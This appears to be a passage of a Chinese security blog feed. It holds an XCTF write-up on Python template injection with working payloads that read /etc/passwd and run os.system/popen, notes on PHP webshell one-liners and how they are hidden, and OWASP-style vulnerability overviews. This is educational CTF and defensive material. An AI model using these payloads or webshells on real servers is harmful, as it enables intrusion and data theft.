<p>我们可以利用的方法有<code>&lt;type 'file'&gt;</code>等。（甚至file一般是第40号）</p>
<pre><code>().__class__.__base__.__subclasses__()[40]('/etc/passwd').read()
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1622774944103.png" alt="" loading="lazy"><br>
可以从上面的例子中看到我们用file读取了 /etc/passwd ，但是如果想要读取目录怎么办？</p>
<p>那么我们可以寻找万能的os模块。</p>
<p>写脚本遍历。<br>
复制代码</p>
<pre><code>#!/usr/bin/env python
# encoding: utf-8

num = 0

for item in ''.__class__.__mro__[2].__subclasses__():
try:
if 'os' in item.__init__.__globals__:
print num,item
num+=1
except:
print '-'
num+=1
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1622774949520.png" alt="" loading="lazy"><br>
直接调用就好了。可以直接调用system函数，有了shell其他的问题不就解决了吗？</p>
<pre><code>().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')
</code></pre>
<p>5.读写文件</p>
<p>当然，某些情况下system函数会被过滤。这时候也可以采用os模块的listdir函数来读取目录。(可以配合file来实现任意文件读取)</p>
<pre><code>().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')  #读取本级目录
</code></pre>
<p>另外在某些不得已的情况下可以使用以下方式来读取文件。（没见过这种情况）。</p>
<p>方法一：</p>
<pre><code>''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()　　　　#把 read() 改为 write() 就是写文件
</code></pre>
<p>方法二：</p>
<p>存在的子模块可以通过 .index()方式来查询</p>
<pre><code>''.__class__.__mro__[2].__subclasses__().index(file)
40
</code></pre>
<p>用file模块来查询。</p>
<pre><code>[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()
</code></pre>
<p>这里拿 xctf 中的 Web_python_template_injection 做例子</p>
<p>进入题目界面可以看到<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622774955812.png" alt="" loading="lazy"><br>
尝试模板注入      <code>{{7*7}}</code></p>
<p>/49的存在说明这条指令被忠实地执行了。接下来，开始想办法编代码拿到服务器的控制台权限 首先，题目告诉我们这是一个python注入问题，那么脚本肯定也是python的，思考怎样用python语句获取控制台权限：想到了os.system和os.popen(<a href="https://blog.csdn.net/sxingming/article/details/52071514">参考资料</a>),这两句前者返回<strong>退出状态码</strong>,后者<strong>以file形式</strong>返回<strong>输出内容</strong>,我们想要的是内容，所所以选择os.popen<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622774960628.png" alt="" loading="lazy"><br>
知道了要用这一句，那么我要怎么找到这一句呢？python给我们提供了完整的寻找链(参考资料)<br>
class：返回对象所属的类<br>
mro：返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。<br>
base：返回该类所继承的基类 //base__和__mro__都是用来寻找基类的__subclasses：每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br>
init：类的初始化方法<br>
globals：对包含函数全局变量的字典的引用<br>
首先，找到当前变量所在的类：</p>
<p>有回显。尝试模板注入。</p>
<p>构造payload：</p>
<pre><code>{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1622774966196.png" alt="" loading="lazy"></figure>
<p>读目录发现了fl4g。直接用file读取。构造payload:</p>
<pre><code>{{[].__class__.__base__.__subclasses__()[40]('fl4g').read()}}
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1622774971627.png" alt="" loading="lazy"></figure>
<p>拿到了flag。<br>
##注意事项：<br>
复制代码</p>
<pre><code>''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('catfl4g').read()


''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')


''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
</code></pre>
<p>复制代码</p>
<p>以上payload是非常常用的payload</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[web安全相关知识点]]></title>
        <id>https://jinqipiaopiao.github.io/post/web-an-quan-xiang-guan-zhi-shi-dian/</id>
        <link href="https://jinqipiaopiao.github.io/post/web-an-quan-xiang-guan-zhi-shi-dian/">
        </link>
        <updated>2021-05-30T06:31:54.000Z</updated>
        <content type="html"><![CDATA[<h1 id="http-请求头各参数具体含义">HTTP 请求头各参数具体含义</h1>
<p>Header	解释	示例<br>
Accept	指定客户端能够接收的内容类型	Accept: text/plain, text/html<br>
Accept-Charset	浏览器可以接受的字符编码集。	Accept-Charset: iso-8859-5<br>
Accept-Encoding	指定浏览器可以支持的web服务器返回内容压缩编码类型。	Accept-Encoding: compress, gzip<br>
Accept-Language	浏览器可接受的语言	Accept-Language: en,zh<br>
Accept-Ranges	可以请求网页实体的一个或者多个子范围字段	Accept-Ranges: bytes<br>
Authorization	HTTP授权的授权证书	Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==<br>
Cache-Control	指定请求和响应遵循的缓存机制	Cache-Control: no-cache<br>
Connection	表示是否需要持久连接。（HTTP 1.1默认进行持久连接）	Connection: close<br>
Cookie	HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。	Cookie: $Version=1; Skin=new;<br>
Content-Length	请求的内容长度	Content-Length: 348<br>
Content-Type	请求的与实体对应的MIME信息	Content-Type: application/x-www-form-urlencoded<br>
Date	请求发送的日期和时间	Date: Tue, 15 Nov 2010 08:12:31 GMT<br>
Expect	请求的特定的服务器行为	Expect: 100-continue<br>
From	发出请求的用户的Email	From: user@email.com<br>
Host	指定请求的服务器的域名和端口号	Host: www.zcmhi.com<br>
If-Match	只有请求内容与实体相匹配才有效	If-Match: “737060cd8c284d8af7ad3082f209582d”<br>
If-Modified-Since	如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码	If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT<br>
If-None-Match	如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变	If-None-Match: “737060cd8c284d8af7ad3082f209582d”<br>
If-Range	如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag	If-Range: “737060cd8c284d8af7ad3082f209582d”<br>
If-Unmodified-Since	只在实体在指定时间之后未被修改才请求成功	If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT<br>
Max-Forwards	限制信息通过代理和网关传送的时间	Max-Forwards: 10<br>
Pragma	用来包含实现特定的指令	Pragma: no-cache<br>
Proxy-Authorization	连接到代理的授权证书	Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==<br>
Range	只请求实体的一部分，指定范围	Range: bytes=500-999<br>
Referer	先前网页的地址，当前请求网页紧随其后,即来路	Referer: http://www.zcmhi.com/archives/71.html<br>
TE	客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息	TE: trailers,deflate;q=0.5<br>
Upgrade	向服务器指定某种传输协议以便服务器进行转换（如果支持）	Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11<br>
User-Agent	User-Agent的内容包含发出请求的用户信息	User-Agent: Mozilla/5.0 (Linux; X11)<br>
Via	通知中间网关或代理服务器地址，通信协议	Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)<br>
Warning	关于消息实体的警告信息	Warn: 199 Miscellaneous warning</p>
<h1 id="responses-部分-http-header">Responses 部分 | Http Header</h1>
<p>Header	解释	示例<br>
Accept-Ranges	表明服务器是否支持指定范围请求及哪种类型的分段请求	Accept-Ranges: bytes<br>
Age	从原始服务器到代理缓存形成的估算时间（以秒计，非负）	Age: 12<br>
Allow	对某网络资源的有效的请求行为，不允许则返回405	Allow: GET, HEAD<br>
Cache-Control	告诉所有的缓存机制是否可以缓存及哪种类型	Cache-Control: no-cache<br>
Content-Encoding	web服务器支持的返回内容压缩编码类型。	Content-Encoding: gzip<br>
Content-Language	响应体的语言	Content-Language: en,zh<br>
Content-Length	响应体的长度	Content-Length: 348<br>
Content-Location	请求资源可替代的备用的另一地址	Content-Location: /index.htm<br>
Content-MD5	返回资源的MD5校验值	Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==<br>
Content-Range	在整个返回体中本部分的字节位置	Content-Range: bytes 21010-47021/47022<br>
Content-Type	返回内容的MIME类型	Content-Type: text/html; charset=utf-8<br>
Date	原始服务器消息发出的时间	Date: Tue, 15 Nov 2010 08:12:31 GMT<br>
ETag	请求变量的实体标签的当前值	ETag: “737060cd8c284d8af7ad3082f209582d”<br>
Expires	响应过期的日期和时间	Expires: Thu, 01 Dec 2010 16:00:00 GMT<br>
Last-Modified	请求资源的最后修改时间	Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT<br>
Location	用来重定向接收方到非请求URL的位置来完成请求或标识新的资源	Location: http://www.zcmhi.com/archives/94.html<br>
Pragma	包括实现特定的指令，它可应用到响应链上的任何接收方	Pragma: no-cache<br>
Proxy-Authenticate	它指出认证方案和可应用到代理的该URL上的参数	Proxy-Authenticate: Basic<br>
refresh	应用于重定向或一个新的资源被创造，在5秒之后重定向（由网景提出，被大部分浏览器支持）	Refresh: 5; url=http://www.atool.org/httptest.php<br>
Retry-After	如果实体暂时不可取，通知客户端在指定时间之后再次尝试	Retry-After: 120<br>
Server	web服务器软件名称	Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)<br>
Set-Cookie	设置Http Cookie	Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1<br>
Trailer	指出头域在分块传输编码的尾部存在	Trailer: Max-Forwards<br>
Transfer-Encoding	文件传输编码	Transfer-Encoding:chunked<br>
Vary	告诉下游代理是使用缓存响应还是从原始服务器请求	Vary: *<br>
Via	告知代理客户端响应是通过哪里发送的	Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)<br>
Warning	警告实体可能存在的问题	Warning: 199 Miscellaneous warning<br>
WWW-Authenticate	表明客户端请求实体应该使用的授权方案	WWW-Authenticate: Basic<br>
X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项<br>
————————————————<br>
版权声明：本文为CSDN博主「xiaochengyihe」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/xiaochengyihe/article/details/80910913</p>
<h1 id="一文详解webshell">一文详解Webshell</h1>
<p>Webshell是黑客经常使用的一种恶意脚本，其目的是获得对服务器的执行操作权限，比如执行系统命令、窃取用户数据、删除web页面、修改主页等，其危害不言而喻。黑客通常利用常见的漏洞，如SQL注入、远程文件包含(RFI)、FTP，甚至使用跨站点脚本攻击(XSS)等方式作为社会工程攻击的一部分，最终达到控制网站服务器的目的。</p>
<p>常见的webshell编写语言为asp、jsp和php。本文将以php Webshell为示例，详细解释Webshell的常用函数、工作方式以及常用隐藏技术。</p>
<p>一、Webshell为何备受黑客青睐<br>
黑客使用Webshell的第一步通常是将其上传到可以访问的服务器中，例如利用用户CMS系统的第三方插件中的漏洞上传一个简单的php Webshell。当然，Webshell类型和作用也不完全相同，一些简单的Webshell只起到连接外界的作用，允许黑客插入更加精准的恶意脚本，执行他们所需要的指令；另外一些则可能更加复杂，带有数据库或文件浏览器，让黑客能够从数千英里之外的地方查看入侵系统的代码和数据。无论何种设计，Webshell都极其危险，是网络罪犯和高级持续威胁(APTs)的常用工具。Webshell常见的攻击特点主要有以下几点：</p>
<p>持久化远程访问</p>
<p>Webshell脚本通常会包含后门，黑客上传Webshell之后，就可以充分利用Webshell的后门实现远程访问并控制服务器，从而达到长期控制网站服务器的目的。此外，在上传完Webshell之后，黑客会选择自己修复漏洞，以确保没有其他人会利用该漏洞。通过这种方式，黑客就可以一种低调的姿态，避免与管理员进行任何交互，同时仍然获得相同的结果。</p>
<p>提权</p>
<p>在服务器没有配置错误的情况下，Webshell将在web服务器的用户权限下运行，而用户权限是有限的。通过Webshell，黑客可以利用系统上的本地漏洞来实现权限提升，从而获得Root权限，这样黑客基本上可以在系统上做任何事情，包括安装软件、更改权限、添加和删除用户、窃取密码、阅读电子邮件等等。</p>
<p>隐蔽性极强</p>
<p>Webshell可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制的服务器或远程主机交互的数据都是通过80端口传递，因此不会被防火墙拦截，在没有记录流量的情况下，Webshell使用post包发送，也不会被记录在系统日志中，只会在Web日志中记录一些数据提交的记录。</p>
<p>二、Webshell常用的PHP函数<br>
Webshell几乎适用于所有Web编程语言。之所以关注PHP，是因为它是web上使用最广泛的编程语言。下面是PHP中一些执行shell命令最常用的函数。</p>
<p>system() exec() shell_exec() shell_exec() proc_open() 倒引号</p>
<p>很多PHP开发人员并没有意识到这一点，但是PHP会首先执行shell命令中倒引号（<code>）内的内容。请注意，倒引号（</code>）和单引号（’）不同。</p>
<p>三、黑客如何隐藏Webshell<br>
修改报头</p>
<p>黑客使用用户代理字符串而不是通过$_POST 请求参数来传递命令的。</p>
<pre><code>&lt;?php system($_SERVER['HTTP_USER_AGENT']);?&gt;
</code></pre>
<p>然后，黑客可以通过将命令放在User-Agent HTTP报头中来制作特定的HTTP请求。<br>
在服务器日志中可以看到这一行为的效果，其中第二个请求中的HTTP User-Agent被cat /etc/passwd命令替换了。<br>
上述方法会产生很大噪声，可以很容易地提示管理员查看服务器日志。但采用下列方法，管理员这很难发现。</p>
<pre><code>&lt;?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']);?&gt;
</code></pre>
<p>这种方法没有留下关于执行命令的任何可见轨迹（至少在访问日志中是这样）。</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1622358978210.png" alt="" loading="lazy"><br>
注意：黑客通常会在函数前使用@运算符，以防发生任何错误，写入错误日志。<br>
混淆</p>
<p>黑客使用各种混淆技术，以避免被管理员检测到。他们不断提出新的更复杂的方法来隐藏其代码并绕过安全系统。下面是我们看到的一些最常用的技术。</p>
<p>（1）删除空格换行符</p>
<p>通过从代码块中删除空格换行符，代码看起来像一个大字符串，这就使得代码的可读性降低并且更难识别脚本要实现什么目的。<br>
（2）加密技术</p>
<p>该技术可以对代码进行加密，降低代码的可读性，并且充分利用运行时可以重建代码的各种函数。<br>
(3）使用Hex进行混淆</p>
<p>ASCII字符的十六进制值也可以用于进一步混淆Webshell命令，下面的例子可以很好地说明混淆技术在Webshell中的应用。<br>
（4）通过可控输入实现混淆</p>
<p>PHP常用的可控输入包括: $_GET, $_POST, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>R</mi></msub><mi>E</mi><mi>Q</mi><mi>U</mi><mi>E</mi><mi>S</mi><mi>T</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">_REQUEST,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">Q</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mpunct">,</span></span></span></span>_FILES,$_SERVER $_COOKIE等，是PHP预定义的变量，可以将黑客自定义的值传递给浏览器中。</p>
<p>以下示例很简单，但很实用。虽然未对代码进行编码或加密，但由于它没有使用任何可疑的函数名（例如eval()或assert()）、冗长的编码字符串、复杂的代码，因此与之前的代码相比，可检测性仍然较低。最重要的是，当管理员查看日志时，它不会引起任何危险。<br>
预防</p>
<p>通常，黑客会利用Web服务器软件中存在的漏洞来安装Webshell。因此，消除这些漏洞对于避免失陷Web服务器的潜在风险很重要。以下是一些与Webshell相关的预防措施。</p>
<p>如果不使用，要禁用危险的PHP函数，例如exec()、shell_exec()、passthru()、system()、show_source()、proc_open()、pcntl_exec()、eval()与assert()。</p>
<p>如果必须要启用这些命令，请确保未授权用户无法访问这些脚本。此外，使用escapeshellarg()和escapeshellcmd()可以确保不能将用户输入注入到shell命令中，从而导致命令执行漏洞。</p>
<p>如果Web应用程序正在使用上传表单，请确保上传的表单是安全的，并且仅允许上传白名单所允许的文件类型。</p>
<p>不要相信用户输入的信息。</p>
<p>不要盲目使用在线论坛或网站上的代码。</p>
<p>对于WordPress，如果不需要，要避免安装第三方插件。如果需要使用插件，请确保插接件其信誉良好且经常更新。</p>
<p>在敏感目录（如图片或上传）中禁用PHP执行。</p>
<p>锁定Web服务器用户权限。</p>
<p>上面给出的是一些简单的Webshell检测和预防措施。面对较为复杂的Webshell攻击，则需要采用一些专业的Webshell检测工具来实现了。</p>
<p>六、总结<br>
Webshell编码简单，使用方便，但由于许多Web服务器的设置方式问题，即使是一个简单的脚本也足以造成严重的破坏。这就是为什么有成千上万的公开Webshell的原因所在。Webshell存在如此多的变种，导致入侵检测和入侵防御系统（IDS/IPS）很难检测到它们，尤其是当使用签名来检测此类Webshell时。有些Webshell非常复杂，即使进行行为分析，也几乎无法检测到。</p>
<p>话虽如此，但Webshell只是漏洞利用后的实施工具，这就意味着首先要尽早检测出Webshell，防止其上传后进行漏洞利用。<br>
参考网址：https://www.freebuf.com/articles/web/235651.html</p>
<p>你听说过“ 0day漏洞 ”吗？这个词让人联想到世界末日的景像，其中的技术要么达到了出神入化甚至疯狂的状态，要么又回到了CRT显示器和绿屏时代。</p>
<p>说实话，0day没有那么不祥的征兆。但是就是非常严重。实际上，在所有已知的漏洞中，0day通常是能够造成最大的风险。这是为什么？原因在于定义。</p>
<p>什么是0day漏洞？<br>
0day漏洞是指负责应用程序的程序员或供应商所未知的软件缺陷。因为该漏洞未知，所以没有可用的补丁程序。</p>
<p>换句话说，该漏洞是由不直接参与项目的人员发现的。术语“0day”是指从发现漏洞到对其进行首次攻击之间的天数。0day漏洞公开后，便称为nday漏洞。</p>
<p>0day时间表的工作原理如下：</p>
<p>一个人或一个公司创建了一个软件，其中包含一个漏洞，但涉及编程或发行的人员却不知道。<br>
在开发人员有机会定位或解决问题之前，有人（除负责软件的人员之外）发现了漏洞。<br>
发现该漏洞的人会创建恶意代码来利用该漏洞。<br>
该漏洞被释放。<br>
负责人员将被告知漏洞利用并打补丁。<br>
该漏洞不再被视为0day。<br>
补丁发布。<br>
大多数情况下，针对0day漏洞的攻击很少立即被发现。发现这些缺陷通常可能需要几天或几个月的时间，这才使这类漏洞如此危险。</p>
<p>如何处理0day漏洞？<br>
作为管理员或用户，可能无能为力。最好的情况是永远不要使用未打补丁版本的软件。这在 Linux 社区中通常很常见，在 Linux 社区中，许多用户不会安装.0发行版。相反，他们将等待.1版本（例如Ubuntu 19.10.1）。通过避免最初发布的版本，可能会免受第一批产品中至少任何未发现的0day漏洞的影响。这并不意味着.1版本将修补所有的0day漏洞。如果有的话，甚至在下一个主要版本之前，它们都可能未被发现。经常在新闻中看到存在一段时间的软件中发现的新漏洞。</p>
<p>作为开发人员，最好的办法是招募尽可能多的版本测试人员。这是开源软件比专有软件更具优势的地方。在源代码公开的情况下，任何人都可以审查和测试代码。而且，Beta开源软件通常面向公众发布，因此任何人都可以进行测试。另一方面，付费软件通常不会向公众发布Beta（当然，也有例外）。当应用程序的beta测试人员数量有限时，发现的bug较少，从而导致0day漏洞的可能性更高。</p>
<p>因此，最终用户应该推迟采用全新的发行版本，而开发人员需要先进行测试、测试和测试，然后再发布给公众。</p>
<p>最后，你可以做的一件事就是确保将错误报告提交给开发人员和公司。错误报告是程序员解决软件问题的一种有效方法。而且，你永远都不会知道，你提交的BUG很可能导致0day漏洞的发现和后续修补。</p>
<p>01 注入漏洞<br>
1）SQL注入（SQL Injection）<br>
由于程序对SQL相关的一些敏感字符缺少过滤or转换，攻击者把SQL命令插入到用户提交的数据中，欺骗服务器执行恶意的SQL命令，非法获取到内部权限和数据。<br>
风险：读取or篡改数据库的数据，获取服务器or管理员权限<br>
类型：<br>
a.数据型<br>
b.字符型<br>
其他注入方式<br>
c.伪静态注入<br>
d.GET &amp; POST注入<br>
e.Cookie注入</p>
<p>2）SQL盲注（SQL Blind Injection）<br>
a.基于布尔的盲注<br>
SQL注入过程中，应用程序仅仅返回True页面和False页面，无法根据应用程序的返回页面得到数据库信息，但可通过构造逻辑条件（如比较大小）向服务端请求后的返回页面来分析判断我们所需要的数据库信息。<br>
b.基于时间的盲注<br>
注入的SQL代码影响后台数据库的功能，但此时Web的前端页面始终显示True页面，知识页面返回的响应时间有差异，可以根据时间差来推断注入语句中的判断条件真假，继而获取数据库相关的信息。</p>
<p>3）OS命令注入<br>
OS Command Injection，当应用程序使用外部输入的字符串，or使用受外部影响的字符串来组装命令时，若没有进行安全过滤防范，可能产生OS命令的注入攻击，甚至操作服务器相关的权限。</p>
<p>4）Xpath注入<br>
利用XPath解析器的松散输入和容错特性，能够在URL、表单或其它信息上附带恶意的XPath查询代码，以获得权限信息的访问权并更改这些信息。</p>
<p>......</p>
<p>02 失效的身份认证和会话管理<br>
用户身份认证和会话管理是一个应用程序中最关键的过程，有缺陷的设计会严重破坏这个过程。在开发Web应用程序时，开发人员往往只关注Web应用程序所需的功能，通常会建立自定义的认证和会话管理方案。但要正确实现这些方案却很难，结果这些自定义的方案往往在如下方面存在漏洞：退出、密码管理、超时、记住我、密码问题、帐户更新等。</p>
<p>03 敏感信息泄露<br>
在最近几年，这是最常见的、最具影响力的攻击。这个领域最常见的漏洞是不对敏感信息进行加密。在数据加密过程中，常见的问题是不安全的密钥生成和管理以及使用弱加密算法、弱协议和弱密码。特别是使用弱的哈希算法来保护密码。<br>
攻击者不是直接攻击密码，而是在传输过程中或从客户端（例如：浏览器）窃取密钥、发起中间人攻击，或从服务器端窃取明文数据。</p>
<p>04 XML外部实体（XXE）<br>
默认情况下，许多旧的XML处理器能够对外部实体、XML进程中被引用和评估的URI进行规范。如果攻击者可以上传XML文档或者在XML文档中添加恶意内容，通过易受攻击的代码、依赖项或集成，他们就能够攻击含有缺陷的XML处理器。<br>
XXE缺陷可用于提取数据、执行远程服务器请求、扫描内部系统、执行拒绝服务攻击和其他攻击。</p>
<p>05 失效的访问控制<br>
由于缺乏自动化的检测和应用程序开发人员缺乏有效的功能测试，因而访问控制缺陷很常见。访问控制检测通常不适用于自动化的静态或动态测试。手动测试是检测访问控制缺失或失效的最佳方法，包括：HTTP方法（如：GET和PUT）、控制器、直接对象引用。<br>
攻击者可以冒充用户、管理员或拥有特权的用户，或者创建、访问、更新或删除任何记录。</p>
<p>06 安全配置错误<br>
安全配置错误可以发生在一个应用程序堆栈的任何层面，包括网络服务、平台、Web服务器、应用服务器、数据库、框架、自定义代码和预安装的虚拟机、容器和存储。自动扫描器可用于检测错误的安全配置、默认帐户的使用或配置、不必要的服务、遗留选项等。<br>
通常，攻击者能够通过未修复的漏洞、访问默认账户、不再使用的页面、未受保护的文件和目录等来取得对系统的未授权的访问或了解。</p>
<p>07 跨站脚本（XSS）<br>
XSS是OWASP Top10中第二普遍的安全问题，存在于近三分之二的应用中。由于程序缺少对某些敏感字符的过滤or转换，攻击者对在url或输入框中输入HTML/JS恶意代码提交成功后并被执行，获取用户or程序敏感信息。<br>
XSS对于反射和DOM的影响是中等的，而对于存储的XSS，XSS的影响更为严重，譬如在受攻击者的浏览器上执行远程代码，例如：窃取凭证和会话或传递恶意软件等。</p>
<p>08 不安全的反序列化<br>
反序列化漏洞有十年的历史，存在于不同的编程语言中，最为明显的当属Java、PHP、Python、Ruby。漏洞的本质就是反序列化机制打破了数据和对象的边界，导致攻击者注入的恶意序列化数据在反序列化过程中被还原成对象，控制了对象就可能在目标系统上面执行攻击代码。</p>
<p>09 使用含有已知漏洞的组件<br>
这种安全漏洞普遍存在。基于组件开发的模式使得多数开发团队不了解其应用或API中使用的组件，更谈不上及时更新这些组件了。如Retire.js之类的扫描器可以帮助发现此类漏洞，但这类漏洞是否可以被利用还需花费额外的时间去研究。</p>
<p>10 不足的日志记录和监控<br>
对不足的日志记录及监控的利用几乎是每一个重大安全事件的温床。攻击者依靠监控的不足和响应的不及时来达成他们的目标而不被知晓。<br>
根据行业调查的结果，此问题被列入了Top10。判断你是否有足够监控的一个策略是在渗透测试后检查日志。测试者的活动应被充分的记录下来，能够反映出他们造成了什么样的影响。<br>
多数成功的攻击往往从漏洞探测开始。允许这种探测会将攻击成功的可能性提高到近100%；据统计，在2016年确定一起数据泄露事件平均需要花191天时间，这么长时间里损害早已发生。</p>
<p>11 跨站请求伪造（CSRF）<br>
CSRF是利用某些web应用程序允许攻击者预测一个特定操作的所有细节。由于浏览器自动发送会话cookie等认证凭证，攻击者能创建恶意web页面产生伪造请求。这些伪造请求很难与合法请求区分开。<br>
攻击者能欺骗受害用户完成该受害者所允许的任意状态改变的操作，比如：更新帐号细节，完成购物，注销甚至登录等操作。</p>
<p>12 未验证的重定向和转发<br>
应用程序经常将用户重定向到其他网页，或以类似的方式进行内部转发。有时，目标网页是通过一个未经验证的参数来指定的，这就允许攻击者选择目标页面。<br>
攻击者链接到未验证的重定向并诱使受害者去点击。由于是链接到有效的网站，受害者很有可能去点击。攻击者利用不安全的转发绕过安全检测。<br>
这种重定向可能试图安装恶意软件或者诱使受害者泄露密码或其他敏感信息。不安全的转发可能允许绕过访问控制。</p>
<p>12 弱口令漏洞<br>
弱口令(weak password) ，没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令，如：生日、名字、简单的顺序数字or字符。</p>
<p>13 文件上传漏洞<br>
文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器并执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。<br>
WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</p>
<p>14 缓冲区溢出<br>
在计算机内部，输入数据通常被存放在一个临时空间内，这个临时存放的空间就被称为缓冲区，缓冲区的长度事先已经被程序或者操作系统定义好了。向缓冲区内填充数据，如果数据的长度很长，超过了缓冲区本身的容量，那么数据就会溢出存储空间，而这些溢出的数据还会覆盖在合法的数据上。<br>
操作系统所使用的缓冲区又被称为堆栈，在各个操作进程之间，指令被临时存储在堆栈当中，堆栈也会出现缓冲区溢出。 当一个超长的数据进入到缓冲区时，超出部分就会被写入其他缓冲区，其他缓冲区存放的可能是数据、下一条指令的指针，或者是其他程序的输出内容，这些内容都被覆盖或者破坏掉。</p>
<p>15 业务逻辑漏洞<br>
业务逻辑问题是一种设计缺陷，逻辑缺陷表现为设计者或开发者在思考过程中做出的特殊假设存在明显或隐含的错误。攻击者会特别注意目标应用程序采用的逻辑方式，设法了解设计者与开发者做出的可能假设，然后考虑如何攻破这些假设。攻击者挖掘逻辑漏洞有两个重点：业务流程、http/https请求篡改。<br>
业务逻辑漏洞经常出现的场景为：账户（注册/登录/密码找回）、交易、支付、个人信息修改。<br>
作者：Fighting_001<br>
链接：https://www.jianshu.com/p/184863b67bb1<br>
来源：简书<br>
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
<p>本地包含时如果想要打开的是一个数组最好用file打开如file(&quot;flag.php&quot;)<br>
<img src="https://jinqipiaopiao.github.io//post-images/1623834341248.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1623834380453.png" alt="" loading="lazy"><br>
file() 函数把整个文件读入一个数组中。<br>
与 file_get_contents() 类似，不同的是 file() 将文件作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。如果失败，则返回 false。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[.user.ini文件构成的PHP后门]]></title>
        <id>https://jinqipiaopiao.github.io/post/userini-wen-jian-gou-cheng-de-php-hou-men/</id>
        <link href="https://jinqipiaopiao.github.io/post/userini-wen-jian-gou-cheng-de-php-hou-men/">
        </link>
        <updated>2021-05-27T00:05:12.000Z</updated>
        <content type="html"><![CDATA[<p>.user.ini。他比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi与逆行的php都可以用这个方法。我的nginx服务器全部都是fpm/fastcgi，我的IIS php5.3以上的全部用的是fastcgi/cgi，我win下的apache上也用的fcgi，可谓很广，不像.htaccess有局限性</p>
<p>那么什么是.user.ini?<br>
这得从php.ini说起了，php.ini是php默认的配置文件，其中包括了很多php的配置，则这些配置中，又分为几种:PHP_INI_SYSTEM,PHP_INI_PERDIR,PHP_INI_ALL,PHP_INI_USER<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622075227664.png" alt="" loading="lazy"><br>
其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在这里又解释了：</p>
